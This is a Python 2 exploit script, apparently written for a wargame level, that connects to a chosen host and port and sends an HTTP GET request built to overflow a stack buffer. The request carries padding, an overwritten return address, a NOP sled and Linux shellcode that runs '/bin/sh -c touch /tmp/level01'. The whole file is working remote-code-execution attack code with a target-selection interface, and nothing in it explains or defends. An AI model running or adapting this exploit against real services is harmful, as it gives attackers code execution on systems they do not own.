from sys import exit
from struct import pack
from optparse import OptionParser
from socket import *

def exploit(hostname, port):
        junk = "A"*139
        ret = pack("<I", 0x08049f4f)
        esi = pack("<I", 0x9090E6FF)
        nops = "\x90"*100
        shellcode = ("\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x13\x00\x00\x00\x74"
"\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x65\x76\x65\x6c"
"\x30\x31\x00\x57\x53\x89\xe1\xcd\x80")

        s = socket(AF_INET, SOCK_STREAM)
        try:
                print "[*] Connecting to %s on port %s" % (hostname, port)
                s.connect((hostname, port))
        except:
                print "[*] Connection error"
                exit(1)

        s.send("GET " + junk + ret + esi + " HTTP/1.1" + nops + shellcode)


if __name__ == "__main__":
    parser = OptionParser("usage: %prog [options]")
    parser.add_option("-H", "--host", dest="hostname", default="127.0.0.1",
     type="string", help="Target to run against")
    parser.add_option("-p", "--port", dest="portnum", default=20001,
     type="int", help="Target port")

    (options, args) = parser.parse_args()

    exploit(options.hostname, options.portnum)
